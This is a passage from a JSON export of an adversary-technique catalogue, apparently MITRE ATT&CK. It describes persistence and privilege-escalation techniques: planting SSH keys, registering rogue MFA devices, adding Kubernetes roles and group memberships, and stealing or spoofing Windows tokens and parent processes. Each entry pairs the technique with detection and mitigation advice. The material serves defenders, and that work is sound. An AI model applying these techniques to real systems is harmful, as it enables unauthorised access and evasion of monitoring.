target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Rhino Security Labs AWS Privilege Escalation)</a>\n\nIn some cases, adversaries may add roles to adversary-controlled accounts outside the victim cloud tenant. This allows these external accounts to perform actions inside the victim tenant without requiring the adversary to Create Account or modify a victim-owned account. <a href=\"https://www.invictus-ir.com/news/the-curious-case-of-dangerdev-protonmail-me\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Invictus IR DangerDev 2024)</a>","detection":"Collect activity logs from IAM services and cloud administrator accounts to identify unusual activity in the assignment of roles to those accounts. Monitor for accounts assigned to admin roles that go over a certain threshold of known admins.","platforms":["IaaS","Identity Provider","Office Suite","SaaS"],"dataSources":["User Account: User Account Modification"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Ensure that low-privileged user accounts do not have permissions to add permissions to accounts or update IAM policies."},{"id":"M1026","name":"Privileged Account Management","description":"Ensure that all accounts use the least privileges they require. In Azure AD environments, consider using Privileged Identity Management (PIM) to define roles that require two or more approvals before assignment to users. <a href=\"https://learn.microsoft.com/en-us/azure/active-directory/privileged-identity-management/azure-ad-pim-approval-workflow\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Requests for Azure AD Roles in Privileged Identity Management)</a>"},{"id":"M1032","name":"Multi-factor Authentication","description":"Use multi-factor authentication for user and privileged accounts."}]},{"id":"T1098.004","name":"SSH Authorized Keys","description":"Adversaries may modify the SSH <code>authorized_keys</code> file to maintain persistence on a victim host. Linux distributions, macOS, and ESXi hypervisors commonly use key-based authentication to secure the authentication process of SSH sessions for remote management. The <code>authorized_keys</code> file in SSH specifies the SSH keys that can be used for logging into the user account for which the file is configured. This file is usually found in the user's home directory under <code>&amp;lt;user-home&amp;gt;/.ssh/authorized_keys</code> (or, on ESXi, <code>/etc/ssh/keys-&lt;username&gt;/authorized_keys</code>). <a href=\"https://www.ssh.com/ssh/authorized_keys/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SSH Authorized Keys)</a> Users may edit the system’s SSH config file to modify the directives <code>PubkeyAuthentication</code> and <code>RSAAuthentication</code> to the value <code>yes</code> to ensure public key and RSA authentication are enabled, as well as modify the directive <code>PermitRootLogin</code> to the value <code>yes</code> to enable root authentication via SSH. <a href=\"https://knowledge.broadcom.com/external/article/313767/allowing-ssh-access-to-vmware-vsphere-es.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Broadcom ESXi SSH)</a> The SSH config file is usually located under <code>/etc/ssh/sshd_config</code>.\n\nAdversaries may modify SSH <code>authorized_keys</code> files directly with scripts or shell commands to add their own adversary-supplied public keys. In cloud environments, adversaries may be able to modify the SSH authorized_keys file of a particular virtual machine via the command line interface or rest API. For example, by using the Google Cloud CLI’s “add-metadata” command an adversary may add SSH keys to a user account. <a href=\"https://cloud.google.com/sdk/gcloud/reference/compute/instances/add-metadata\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Google Cloud Add Metadata)</a> <a href=\"https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Google Cloud Privilege Escalation)</a> Similarly, in Azure, an adversary may update the authorized_keys file of a virtual machine via a PATCH request to the API. <a href=\"https://docs.microsoft.com/en-us/rest/api/compute/virtual-machines/update\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Azure Update Virtual Machines)</a> This ensures that an adversary possessing the corresponding private key may log in as an existing user via SSH. <a href=\"https://www.venafi.com/blog/growing-abuse-ssh-keys-commodity-malware-campaigns-now-equipped-ssh-capabilities\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Venafi SSH Key Abuse)</a> <a href=\"https://www.cybereason.com/blog/new-pervasive-worm-exploiting-linux-exim-server-vulnerability\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cybereason Linux Exim Worm)</a> It may also lead to privilege escalation where the virtual machine or instance has distinct permissions from the requesting user.\n\nWhere authorized_keys files are modified via cloud APIs or command line interfaces, an adversary may achieve privilege escalation on the target virtual machine if they add a key to a higher-privileged user. \n\nSSH keys can also be added to accounts on network devices, such as with the <code>ip ssh pubkey-chain</code> Network Device CLI command. <a href=\"https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/security/d1/sec-d1-cr-book/sec-cr-i3.html#wp1254331478\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: cisco_ip_ssh_pubkey_ch_cmd)</a>","detection":"Use file integrity monitoring to detect changes made to the <code>authorized_keys</code> file for each user on a system. Monitor for suspicious processes modifying the <code>authorized_keys</code> file. In cloud environments, monitor instances for modification of metadata and configurations.\n\nMonitor for changes to and suspicious processes modifiying <code>/etc/ssh/sshd_config</code>.\n\nFor network infrastructure devices, collect AAA logging to monitor for rogue SSH keys being added to accounts.","platforms":["ESXi","IaaS","Linux","macOS","Network Devices"],"dataSources":["Command: Command Execution","Process: Process Creation","File: File Modification"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"In cloud environments, ensure that only users who explicitly require the permissions to update instance metadata or configurations can do so."},{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Restrict access to the <code>authorized_keys</code> file."},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Disable SSH if it is not necessary on a host or restrict SSH access for specific users/groups using <code>/etc/ssh/sshd_config</code>. Setting the <code>PermitRootLogin</code> directive to <code>no</code> will prevent the root user from logging in via SSH. <a href=\"https://knowledge.broadcom.com/external/article/313767/allowing-ssh-access-to-vmware-vsphere-es.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Broadcom ESXi SSH)</a>"}]},{"id":"T1098.005","name":"Device Registration","description":"Adversaries may register a device to an adversary-controlled account. Devices may be registered in a multifactor authentication (MFA) system, which handles authentication to the network, or in a device management system, which handles device access and compliance.\n\nMFA systems, such as Duo or Okta, allow users to associate devices with their accounts in order to complete MFA requirements. An adversary that compromises a user’s credentials may enroll a new device in order to bypass initial MFA requirements and gain persistent access to a network. <a href=\"https://www.cisa.gov/uscert/ncas/alerts/aa22-074a\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CISA MFA PrintNightmare)</a> <a href=\"https://www.darkreading.com/threat-intelligence/fireeye-s-mandia-severity-zero-alert-led-to-discovery-of-solarwinds-attack\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: DarkReading FireEye SolarWinds)</a> In some cases, the MFA self-enrollment process may require only a username and password to enroll the account's first device or to enroll a device to an inactive account. <a href=\"https://www.mandiant.com/resources/blog/apt29-continues-targeting-microsoft\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant APT29 Microsoft 365 2022)</a>\n\nSimilarly, an adversary with existing access to a network may register a device or a virtual machine to Entra ID and/or its device management system, Microsoft Intune, in order to access sensitive data or resources while bypassing conditional access policies. <a href=\"https://o365blog.com/post/devices/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AADInternals - Device Registration)</a> <a href=\"https://o365blog.com/post/mdm\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AADInternals - Conditional Access Bypass)</a> <a href=\"https://www.microsoft.com/security/blog/2022/03/22/dev-0537-criminal-actor-targeting-organizations-for-data-exfiltration-and-destruction/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft DEV-0537)</a> <a href=\"https://expel.com/blog/observing-atlas-lion-part-one/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Expel Atlas Lion 2025)</a>\n\nDevices registered in Entra ID may be able to conduct Internal Spearphishing campaigns via intra-organizational emails, which are less likely to be treated as suspicious by the email client. <a href=\"https://www.microsoft.com/security/blog/2022/01/26/evolved-phishing-device-registration-trick-adds-to-phishers-toolbox-for-victims-without-mfa\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft - Device Registration)</a> Additionally, an adversary may be able to perform a Service Exhaustion Flood on an Entra ID tenant by registering a large number of devices. <a href=\"https://o365blog.com/post/bprt/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AADInternals - BPRT)</a>","detection":"","platforms":["Windows","Identity Provider"],"dataSources":["Application Log: Application Log Content","Active Directory: Active Directory Object Creation","User Account: User Account Modification"],"mitigations":[{"id":"M1032","name":"Multi-factor Authentication","description":"Require multi-factor authentication to register devices in Entra ID. <a href=\"https://www.microsoft.com/security/blog/2022/01/26/evolved-phishing-device-registration-trick-adds-to-phishers-toolbox-for-victims-without-mfa\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft - Device Registration)</a> Configure multi-factor authentication systems to disallow enrolling new devices for inactive accounts. <a href=\"https://www.cisa.gov/uscert/ncas/alerts/aa22-074a\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CISA MFA PrintNightmare)</a> When first enrolling MFA, use conditional access policies to restrict device enrollment to trusted locations or devices, and consider using temporary access passes as an initial MFA solution to enroll a device. <a href=\"https://www.mandiant.com/resources/blog/apt29-continues-targeting-microsoft\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant APT29 Microsoft 365 2022)</a>"}]},{"id":"T1098.006","name":"Additional Container Cluster Roles","description":"An adversary may add additional roles or permissions to an adversary-controlled user or service account to maintain persistent access to a container orchestration system. For example, an adversary with sufficient permissions may create a RoleBinding or a ClusterRoleBinding to bind a Role or ClusterRole to a Kubernetes account. <a href=\"https://kubernetes.io/docs/concepts/security/rbac-good-practices/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kubernetes RBAC)</a> <a href=\"https://blog.aquasec.com/leveraging-kubernetes-rbac-to-backdoor-clusters\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Aquasec Kubernetes Attack 2023)</a> Where attribute-based access control (ABAC) is in use, an adversary with sufficient permissions may modify a Kubernetes ABAC policy to give the target account additional permissions. <a href=\"https://kubernetes.io/docs/reference/access-authn-authz/abac/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kuberentes ABAC)</a>\n \nThis account modification may immediately follow Create Account or other malicious account activity. Adversaries may also modify existing Valid Accounts that they have compromised.  \n\nNote that where container orchestration systems are deployed in cloud environments, as with Google Kubernetes Engine, Amazon Elastic Kubernetes Service, and Azure Kubernetes Service, cloud-based  role-based access control (RBAC) assignments or ABAC policies can often be used in place of or in addition to local permission assignments. <a href=\"https://cloud.google.com/kubernetes-engine/docs/how-to/iam\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Google Cloud Kubernetes IAM)</a> <a href=\"https://docs.aws.amazon.com/eks/latest/userguide/iam-roles-for-service-accounts.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS EKS IAM Roles for Service Accounts)</a> <a href=\"https://learn.microsoft.com/en-us/azure/aks/concepts-identity\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Azure Kubernetes Service Service Accounts)</a> In these cases, this technique may be used in conjunction with Additional Cloud Roles.","detection":"","platforms":["Containers"],"dataSources":["User Account: User Account Modification"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Ensure that low-privileged accounts do not have permissions to add permissions to accounts or to update container cluster roles."},{"id":"M1032","name":"Multi-factor Authentication","description":"Require multi-factor authentication for user accounts integrated into container clusters through cloud deployments or via authentication protocols such as LDAP or SAML."}]},{"id":"T1098.007","name":"Additional Local or Domain Groups","description":"An adversary may add additional local or domain groups to an adversary-controlled account to maintain persistent access to a system or domain.\n\nOn Windows, accounts may use the <code>net localgroup</code> and <code>net group</code> commands to add existing users to local and domain groups. <a href=\"https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc725622(v=ws.11)\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Net Localgroup)</a> <a href=\"https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754051(v=ws.11)\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Net Group)</a> On Linux, adversaries may use the <code>usermod</code> command for the same purpose. <a href=\"https://www.man7.org/linux/man-pages/man8/usermod.8.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Linux Usermod)</a>\n\nFor example, accounts may be added to the local administrators group on Windows devices to maintain elevated privileges. They may also be added to the Remote Desktop Users group, which allows them to leverage Remote Desktop Protocol to log into the endpoints in the future. <a href=\"https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/allow-log-on-through-remote-desktop-services\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft RDP Logons)</a> Adversaries may also add accounts to VPN user groups to gain future persistence on the network. <a href=\"https://cybersecuritynews.com/superblack-actors-exploiting-two-fortinet-vulnerabilities/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cyber Security News)</a> On Linux, accounts may be added to the sudoers group, allowing them to persistently leverage Sudo and Sudo Caching for elevated privileges. \n\nIn Windows environments, machine accounts may also be added to domain groups. This allows the local SYSTEM account to gain privileges on the domain. <a href=\"https://rootdse.org/posts/monitoring-realtime-activedirectory-domain-scenarios\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: RootDSE AD Detection 2022)</a>","detection":"","platforms":["Windows","macOS","Linux"],"dataSources":["User Account: User Account Modification"],"mitigations":[]}]},{"id":"T1134","name":"Access Token Manipulation","description":"Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.\n\nAn adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e. Token Impersonation/Theft) or used to spawn a new process (i.e. Create Process with Token). An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system. <a href=\"https://pentestlab.blog/2017/04/03/token-manipulation/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Pentestlab Token Manipulation)</a>\n\nAny standard user can use the <code>runas</code> command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens.","detection":"If an adversary is using a standard command-line shell, analysts can detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the <code>runas</code> command. Detailed command-line logging is not enabled by default in Windows. <a href=\"https://technet.microsoft.com/en-us/windows-server-docs/identity/ad-ds/manage/component-updates/command-line-process-auditing\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Command-line Logging)</a>\n\nIf an adversary is using a payload that calls the Windows token APIs directly, analysts can detect token manipulation only through careful analysis of user network activity, examination of running processes, and correlation with other endpoint and network behavior. \n\nThere are many Windows API calls a payload can take advantage of to manipulate access tokens (e.g., <code>LogonUser</code> <a href=\"https://msdn.microsoft.com/en-us/library/windows/desktop/aa378184(v=vs.85).aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft LogonUser)</a>, <code>DuplicateTokenEx</code> <a href=\"https://msdn.microsoft.com/en-us/library/windows/desktop/aa446617(v=vs.85).aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft DuplicateTokenEx)</a>, and <code>ImpersonateLoggedOnUser</code> <a href=\"https://msdn.microsoft.com/en-us/library/windows/desktop/aa378612(v=vs.85).aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft ImpersonateLoggedOnUser)</a>). Please see the referenced Windows API pages for more information.\n\nQuery systems for process and thread token information and look for inconsistencies such as user owns processes impersonating the local SYSTEM account. <a href=\"https://www.blackhat.com/docs/eu-17/materials/eu-17-Atkinson-A-Process-Is-No-One-Hunting-For-Token-Manipulation.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: BlackHat Atkinson Winchester Token Manipulation)</a>\n\nLook for inconsistencies between the various fields that store PPID information, such as the EventHeader ProcessId from data collected via Event Tracing for Windows (ETW), Creator Process ID/Name from Windows event logs, and the ProcessID and ParentProcessID (which are also produced from ETW and other utilities such as Task Manager and Process Explorer). The ETW provided EventHeader ProcessId identifies the actual parent process.","platforms":["Windows"],"dataSources":["Process: OS API Execution","Command: Command Execution","User Account: User Account Metadata","Process: Process Metadata","Process: Process Creation","Active Directory: Active Directory Object Modification"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"An adversary must already have administrator level access on the local system to make full use of this technique; be sure to restrict users and accounts to the least privileges they require."},{"id":"M1026","name":"Privileged Account Management","description":"Limit permissions so that users and user groups cannot create tokens. This setting should be defined for the local system account only. GPO: Computer Configuration &gt; [Policies] &gt; Windows Settings &gt; Security Settings &gt; Local Policies &gt; User Rights Assignment: Create a token object. <a href=\"https://docs.microsoft.com/windows/device-security/security-policy-settings/create-a-token-object\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Create Token)</a> Also define who can create a process level token to only the local and network service through GPO: Computer Configuration &gt; [Policies] &gt; Windows Settings &gt; Security Settings &gt; Local Policies &gt; User Rights Assignment: Replace a process level token. <a href=\"https://docs.microsoft.com/windows/device-security/security-policy-settings/replace-a-process-level-token\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Replace Process Token)</a>\n\nAdministrators should log in as a standard user but run their tools with administrator privileges using the built-in access token manipulation command <code>runas</code>. <a href=\"https://technet.microsoft.com/en-us/library/bb490994.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft runas)</a>"}],"subTechniques":[{"id":"T1134.001","name":"Token Impersonation/Theft","description":"Adversaries may duplicate then impersonate another user's existing token to escalate privileges and bypass access controls. For example, an adversary can duplicate an existing token using <code>DuplicateToken</code> or <code>DuplicateTokenEx</code>. <a href=\"https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetoken\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: DuplicateToken function)</a> The token can then be used with <code>ImpersonateLoggedOnUser</code> to allow the calling thread to impersonate a logged on user's security context, or with <code>SetThreadToken</code> to assign the impersonated token to a thread.\n\nAn adversary may perform Token Impersonation/Theft when they have a specific, existing process they want to assign the duplicated token to. For example, this may be useful for when the target user has a non-network logon session on the system.\n\nWhen an adversary would instead use a duplicated token to create a new process rather than attaching to an existing process, they can additionally Create Process with Token using <code>CreateProcessWithTokenW</code> or <code>CreateProcessAsUserW</code>. Token Impersonation/Theft is also distinct from Make and Impersonate Token in that it refers to duplicating an existing token, rather than creating a new one.","detection":"If an adversary is using a standard command-line shell, analysts can detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the <code>runas</code> command. Detailed command-line logging is not enabled by default in Windows. <a href=\"https://technet.microsoft.com/en-us/windows-server-docs/identity/ad-ds/manage/component-updates/command-line-process-auditing\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Command-line Logging)</a>\n\nAnalysts can also monitor for use of Windows APIs such as <code>DuplicateToken(Ex)</code>, <code> ImpersonateLoggedOnUser </code>, and <code> SetThreadToken </code> and correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.","platforms":["Windows"],"dataSources":["Command: Command Execution","Process: OS API Execution"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"An adversary must already have administrator level access on the local system to make full use of this technique; be sure to restrict users and accounts to the least privileges they require."},{"id":"M1026","name":"Privileged Account Management","description":"Limit permissions so that users and user groups cannot create tokens. This setting should be defined for the local system account only. GPO: Computer Configuration &gt; [Policies] &gt; Windows Settings &gt; Security Settings &gt; Local Policies &gt; User Rights Assignment: Create a token object. <a href=\"https://docs.microsoft.com/windows/device-security/security-policy-settings/create-a-token-object\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Create Token)</a> Also define who can create a process level token to only the local and network service through GPO: Computer Configuration &gt; [Policies] &gt; Windows Settings &gt; Security Settings &gt; Local Policies &gt; User Rights Assignment: Replace a process level token. <a href=\"https://docs.microsoft.com/windows/device-security/security-policy-settings/replace-a-process-level-token\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Replace Process Token)</a>\n\nAdministrators should log in as a standard user but run their tools with administrator privileges using the built-in access token manipulation command <code>runas</code>. <a href=\"https://technet.microsoft.com/en-us/library/bb490994.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft runas)</a>"}]},{"id":"T1134.002","name":"Create Process with Token","description":"Adversaries may create a new process with an existing token to escalate privileges and bypass access controls. Processes can be created with the token and resulting security context of another user using features such as <code>CreateProcessWithTokenW</code> and <code>runas</code>. <a href=\"https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11)\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft RunAs)</a>\n\nCreating processes with a token not associated with the current user may require the credentials of the target user, specific privileges to impersonate that user, or access to the token to be used. For example, the token could be duplicated via Token Impersonation/Theft or created via Make and Impersonate Token before being used to create a process.\n\nWhile this technique is distinct from Token Impersonation/Theft, the techniques can be used in conjunction where a token is duplicated and then used to create a new process.","detection":"If an adversary is using a standard command-line shell (i.e. Windows Command Shell), analysts may detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the <code>runas</code> command or similar artifacts. Detailed command-line logging is not enabled by default in Windows. <a href=\"https://technet.microsoft.com/en-us/windows-server-docs/identity/ad-ds/manage/component-updates/command-line-process-auditing\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Command-line Logging)</a>\n\nIf an adversary is using a payload that calls the Windows token APIs directly, analysts may detect token manipulation only through careful analysis of user activity, examination of running processes, and correlation with other endpoint and network behavior.\n\nAnalysts can also monitor for use of Windows APIs such as <code>CreateProcessWithTokenW</code> and correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.","platforms":["Windows"],"dataSources":["Command: Command Execution","Process: OS API Execution"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"An adversary must already have administrator level access on the local system to make full use of this technique; be sure to restrict users and accounts to the least privileges they require."},{"id":"M1026","name":"Privileged Account Management","description":"Limit permissions so that users and user groups cannot create tokens. This setting should be defined for the local system account only. GPO: Computer Configuration &gt; [Policies] &gt; Windows Settings &gt; Security Settings &gt; Local Policies &gt; User Rights Assignment: Create a token object. <a href=\"https://docs.microsoft.com/windows/device-security/security-policy-settings/create-a-token-object\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Create Token)</a> Also define who can create a process level token to only the local and network service through GPO: Computer Configuration &gt; [Policies] &gt; Windows Settings &gt; Security Settings &gt; Local Policies &gt; User Rights Assignment: Replace a process level token. <a href=\"https://docs.microsoft.com/windows/device-security/security-policy-settings/replace-a-process-level-token\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Replace Process Token)</a>\n\nAdministrators should log in as a standard user but run their tools with administrator privileges using the built-in access token manipulation command <code>runas</code>. <a href=\"https://technet.microsoft.com/en-us/library/bb490994.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft runas)</a>"}]},{"id":"T1134.003","name":"Make and Impersonate Token","description":"Adversaries may make new tokens and impersonate users to escalate privileges and bypass access controls. For example, if an adversary has a username and password but the user is not logged onto the system the adversary can then create a logon session for the user using the <code>LogonUser</code> function. <a href=\"https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-logonuserw\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: LogonUserW function)</a> The function will return a copy of the new session's access token and the adversary can use <code>SetThreadToken</code> to assign the token to a thread.\n\nThis behavior is distinct from Token Impersonation/Theft in that this refers to creating a new user token instead of stealing or duplicating an existing one.","detection":"If an adversary is using a standard command-line shell, analysts can detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the <code>runas</code> command. Detailed command-line logging is not enabled by default in Windows. <a href=\"https://technet.microsoft.com/en-us/windows-server-docs/identity/ad-ds/manage/component-updates/command-line-process-auditing\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Command-line Logging)</a>\n\nIf an adversary is using a payload that calls the Windows token APIs directly, analysts can detect token manipulation only through careful analysis of user network activity, examination of running processes, and correlation with other endpoint and network behavior.\n\nAnalysts can also monitor for use of Windows APIs such as <code>LogonUser</code> and <code> SetThreadToken</code> and correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.","platforms":["Windows"],"dataSources":["Process: OS API Execution","Command: Command Execution"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"An adversary must already have administrator level access on the local system to make full use of this technique; be sure to restrict users and accounts to the least privileges they require."},{"id":"M1026","name":"Privileged Account Management","description":"Limit permissions so that users and user groups cannot create tokens. This setting should be defined for the local system account only. GPO: Computer Configuration &gt; [Policies] &gt; Windows Settings &gt; Security Settings &gt; Local Policies &gt; User Rights Assignment: Create a token object. <a href=\"https://docs.microsoft.com/windows/device-security/security-policy-settings/create-a-token-object\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Create Token)</a> Also define who can create a process level token to only the local and network service through GPO: Computer Configuration &gt; [Policies] &gt; Windows Settings &gt; Security Settings &gt; Local Policies &gt; User Rights Assignment: Replace a process level token. <a href=\"https://docs.microsoft.com/windows/device-security/security-policy-settings/replace-a-process-level-token\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Replace Process Token)</a>\n\nAdministrators should log in as a standard user but run their tools with administrator privileges using the built-in access token manipulation command <code>runas</code>. <a href=\"https://technet.microsoft.com/en-us/library/bb490994.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft runas)</a>"}]},{"id":"T1134.004","name":"Parent PID Spoofing","description":"Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the <code>CreateProcess</code> API call, which supports a parameter that defines the PPID to use. <a href=\"https://blog.didierstevens.com/2009/11/22/quickpost-selectmyparent-or-playing-with-the-windows-process-tree/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: DidierStevens SelectMyParent Nov 2009)</a> This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via <code>svchost.exe</code> or <code>consent.exe</code>) rather than the current user context. <a href=\"https://docs.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft UAC Nov 2018)</a>\n\nAdversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID of PowerShell/Rundll32 to be <code>explorer.exe</code> rather than an Office document delivered as part of Spearphishing Attachment. <a href=\"https://www.countercept.com/blog/detecting-parent-pid-spoofing/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CounterCept PPID Spoofing Dec 2018)</a> This spoofing could be executed via Visual Basic within a malicious Office document or any code that can perform Native API. <a href=\"https://blog.christophetd.fr/building-an-office-macro-to-spoof-process-parent-and-command-line/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CTD PPID Spoofing Macro Mar 2019)</a> <a href=\"https://www.countercept.com/blog/detecting-parent-pid-spoofing/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CounterCept PPID Spoofing Dec 2018)</a>\n\nExplicitly assigning the PPID may also enable elevated privileges given appropriate access rights to the parent process. For example, an adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as <code>lsass.exe</code>), causing the new process to be elevated via the inherited access token. <a href=\"https://blog.xpnsec.com/becoming-system/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: XPNSec PPID Nov 2017)</a>","detection":"Look for inconsistencies between the various fields that store PPID information, such as the EventHeader ProcessId from data collected via Event Tracing for Windows (ETW), Creator Process ID/Name from Windows event logs, and the ProcessID and ParentProcessID (which are also produced from ETW and other utilities such as Task Manager and Process Explorer). The ETW provided EventHeader ProcessId identifies the actual parent process. <a href=\"https://www.countercept.com/blog/detecting-parent-pid-spoofing/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CounterCept PPID Spoofing Dec 2018)</a>\n\nMonitor and analyze API calls to <code>CreateProcess</code>/<code>CreateProcessA</code>, specifically those from user/potentially malicious processes and with parameters explicitly assigning PPIDs (ex: the Process Creation Flags of 0x8XXX, indicating that the process is being created with extended startup information <a href=\"https://docs.microsoft.com/windows/desktop/ProcThread/process-creation-flags\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Process Creation Flags May 2018)</a>). Malicious use of <code>CreateProcess</code>/<code>CreateProcessA</code> may also be proceeded by a call to <code>UpdateProcThreadAttribute</code>, which may be necessary to update process creation attributes. <a href=\"https://www.securityinbits.com/malware-analysis/parent-pid-spoofing-stage-2-ataware-ransomware-part-3\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Secuirtyinbits Ataware3 May 2019)</a> This may generate false positives from normal UAC elevation behavior, so compare to a system baseline/understanding of normal system activity if possible.","platforms":["Windows"],"dataSources":["Process: Process Creation","Process: OS API Execution","Process: Process Metadata"],"mitigations":[]},{"id":"T1134.005","name":"SID-History Injection","description":"Adversaries may use SID-History Injection to escalate privileges and bypass access controls. The Windows security identifier (SID) is a 